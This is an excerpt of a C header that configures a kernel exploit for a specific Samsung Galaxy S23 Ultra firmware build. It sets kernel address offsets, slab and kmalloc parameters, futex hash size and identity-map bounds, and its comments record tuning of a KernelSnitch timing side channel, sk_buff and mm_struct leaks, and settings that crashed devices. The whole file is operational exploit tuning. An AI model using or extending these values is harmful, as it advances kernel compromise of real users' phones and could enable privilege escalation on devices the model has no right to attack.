...
#define BUILD_VARIANT_LABEL "dm3q-S918BXXSAFZG1-app"
...
#define BUILD_FINGERPRINT \
  "samsung/dm3qxxx/qssi:16/BP4A.251205.006/S918BXXSAFZG1:user/release-keys"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
/* S9180 profile (same dm3q / S23 Ultra device, same kernel 33413713) proved
 * from sboot.bin that the kernel Image loads at PHYS_OFFSET+0x80000.
 * text_offset==0, so the physical alias base is 0x80080000. */
#define P0_KERNEL_PHYS_LOAD 0x80080000ULL
/* Same-device geometry (dm3q S23 Ultra): S9180 uses -0x1000; f731u (Z Flip 5,
 * physically different device) used -0xe80.  The reclaimed-payload geometry is
 * a property of the target kernel family, not of the reference PR. */
#define SKB_DATA_DELTA (-0x1000LL)
/* F731U (Android 13, 5.15.189): mm_struct slab 对象实际 0x400 (1024)!
 * kmem_cache_create_usercopy("mm_struct", size=0x3e8, SLAB_HWCACHE_ALIGN)
 * → ALIGN(1000, 64) = 1024 = 0x400。BTF sizeof=0x3e0 未含 slab 对齐，勿用！ */
#define MM_STRUCT_SZ 0x400
/* F731U BTF 实测: KMALLOC_CGROUP=1, NR_KMALLOC_TYPES=3 (common.h 默认 2/4 错误!)
 * 错误 CGROUP_TYPE 导致 KMALLOC_CGROUP_PIPE_SLOT 读错 kmalloc 行 →
 * pipe-buffer cache gate 失败 → sk_buff page leak failed */
#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3
/* ⚠️ F731U boot.img cmdline 有 arm64.nomte + id_aa64pfr1.mte=0 → 内核禁用 MTE!
 * 保持默认 MTE=0（不要学 e1s/e2s 开 1）。v0.2.13 误开 MTE 导致 13/13 全失败。 */
/* F731U 8 核 (Snapdragon 8 Gen 2, DTB 确认 8 CPU) → 内核 futex_hashsize =
 * roundup_pow2(256*num_possible_cpus()) = roundup_pow2(2048) = 2048 = 0x800。
 * 显式指定以匹配内核 hash 掩码（futex.c: futex_init 用 num_possible_cpus）。
 * e1s 10 核用 0x1000；F731U 8 核必须 0x800！ */
#define KERNELSNITCH_FUTEX_HASH_SIZE 0x800
/* ⚠️ v0.2.22 重大回退：KERNELSNITCH_VERBOSE 必须为 0！
 * v0.2.20 加了 verbose=1，但 kernelsnitch.h 在 futex 碰撞测量循环里
 * 打印大量日志 → printf IO 耗时破坏纳秒级时序侧信道 → 碰撞确认失败/
 * 误判 → sk_buff leak 全失败 + 误写内核对象 → 重启！
 * S23U（dm3q-S9180ZHS8FZF5，同 5.15.189 内核，官方 device-tested）
 * 未定义此宏（=0）且成功。对齐 S23U。 */
/* e1s/e2s（硬件验证）调优：mm_struct leak 是概率性的，必须给足尝试次数。
 * ⚠️ 但 v0.2.22 对齐 S23U 官方验证：SLIDE/FOPS_KERNEL_PAGE_SETUP_ATTEMPTS
 *    回退默认 2！S23U（同 5.15.189 内核，device-tested）未定义这些宏即成功。
 *    之前 attempts=8 时 mm_struct 反复失败会累积写坏内核对象 → 重启。
 *    ⚠️ KSNITCH_COLLISIONS 保持默认 4（不要学 e1s 的 5）！
 *    v0.2.16 实测 collisions=5 → 设备重启；e1s 用 5 是 Exynos 新路径。 */

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
/* ⚠️ 2026-08-10 v0.2.19：IDENTITY_END 回退到 64GB（0xffffff9000000000）！
 * v0.2.18 收窄 2GB 实测重启——因为全局收窄影响 pipe 阶段（第一个
 * KernelSnitch sk_buff leak），sk_buff 对象不在 direct map 前 2GB 内，
 * 泄漏行为错乱 → 写坏内核对象 → panic。e1s 的 2GB 边界（
 * APP_KERNEL_PAGE_KSNITCH_IDENTITY_END）只用于 prepare_kernel_page
 * （第二个 KernelSnitch），且 e1s 走 FRESH_P0_SESSION 新路径（per-stage
 * 边界），F731U 老路径没有 per-stage 边界，全局收窄会误伤 pipe 阶段。 */
...
#define P0_FINGERPRINT_HEADER "targets/dm3q-S918BXXSAFZG1/p0_fingerprint.h"
#endif
